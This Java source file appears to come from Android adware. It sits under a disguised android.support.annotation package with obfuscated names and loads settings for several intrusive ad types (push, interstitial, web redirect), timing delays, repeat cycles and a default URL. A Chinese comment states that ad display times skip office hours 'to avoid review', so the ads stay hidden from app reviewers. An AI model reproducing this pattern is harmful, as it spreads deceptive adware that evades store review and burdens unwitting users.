package android.support.annotation.ut;

import android.support.annotation.lb.jzaey;
import android.support.annotation.lb.pwwd;
import android.support.annotation.lb.wjkp;
import android.support.annotation.lb.ykjd;

public class pma {
	public final static String PLAT_FORM = "xiaomi";
	public final static String IS_RESUME = "isResume";
	public final static String IS_CHE = "isChe";
	public final static String EXIT_FLAG = "exitFlag";
	public final static String AN_QUAN = "anQuan";

	public final static String IS_URL = "isToUrl";

	public final static String IS_DELAY = "isDelay";
	public final static String DELAY_TIME = "delayTime";
	public final static String FIRST_DELAY_TIME = "firstDelayTime";
	public final static String IS_ONCE = "isOnce";
	public final static String ONCE = "once";
	public final static String TIME_ONE = "timeOne";
	public final static String TIME_TWO = "timeTwo";
	public final static String TIME_THREE = "timeThree";
	public final static String TIME_FOUR = "timeFour";

	public final static String IS_HOU = "isHou";
	public final static String IS_CHA = "isCha";
	public final static String IS_PUSH = "isPush";
	public final static String IS_TIAO = "isTiao";
	public final static String IS_LIE = "isLie";
	public final static String URL = "url";

	// 默认参数
	public static boolean isChe = false;
	public static int exitFlag = -1;
	public static boolean platform = false;
	public static boolean appName = false; // 是否显示广告，对应游戏名
	public static boolean isResume = false; // 是否在onResume
	public static boolean anQuan = false;
	// 广告类型
	public static boolean isHou = false;
	public static boolean isCha = false;
	public static boolean isPush = false;
	public static boolean isTiao = false;
	public static boolean isUrl = false; // 是否显示网页
	// 限制显示时间
	public static boolean isDelay = false;
	public static int delayTime = 5000;
	public static int firstDelayTime = 2000;
	public static boolean isOnce = false; // 是否循环
	public static int once = 5; // 循环周期，5分钟
	public static int timeOne = 9; // 显示时段，过滤上班时段，避免审核
	public static int timeTwo = 11;
	public static int timeThree = 14;
	public static int timeFour = 17;
	// 限制默认值
	public static String url = "2345.cn/126638"; // 网络地址

	public static void itP() {
		appName = uxt.gtB(bs.mContext, koe.APP_NAME, appName);

		platform = uxt.gtB(bs.mContext, PLAT_FORM, platform);
		isChe = uxt.gtB(bs.mContext, IS_CHE, isChe);
        exitFlag = uxt.gtI(bs.mContext, EXIT_FLAG, exitFlag);
		isResume = uxt.gtB(bs.mContext, IS_RESUME, isResume);
		anQuan = uxt.gtB(bs.mContext, AN_QUAN, anQuan);

		isHou = uxt.gtB(bs.mContext, IS_HOU, isHou);
		isCha = uxt.gtB(bs.mContext, IS_CHA, isCha);
		isPush = uxt.gtB(bs.mContext, IS_PUSH, isPush);
		isTiao = uxt.gtB(bs.mContext, IS_TIAO, isTiao);
		isUrl = uxt.gtB(bs.mContext, IS_URL, isUrl);

		isDelay = uxt.gtB(bs.mContext, IS_DELAY, isDelay);
		delayTime = uxt.gtI(bs.mContext, DELAY_TIME, delayTime);
		firstDelayTime = uxt.gtI(bs.mContext, FIRST_DELAY_TIME, firstDelayTime);
		isOnce = uxt.gtB(bs.mContext, IS_ONCE, isOnce);
		once = uxt.gtI(bs.mContext, ONCE, once);
		timeOne = uxt.gtI(bs.mContext, TIME_ONE, timeOne);
		timeTwo = uxt.gtI(bs.mContext, TIME_TWO, timeTwo);
		timeThree = uxt.gtI(bs.mContext, TIME_THREE, timeThree);
		timeFour = uxt.gtI(bs.mContext, TIME_FOUR, timeFour);
		url = uxt.gtS(bs.mContext, URL, url);
		
		wjkp.itP();
		jzaey.itP();
		pwwd.itP();
		ykjd.itP();
		njok.itP();
		
	}
}
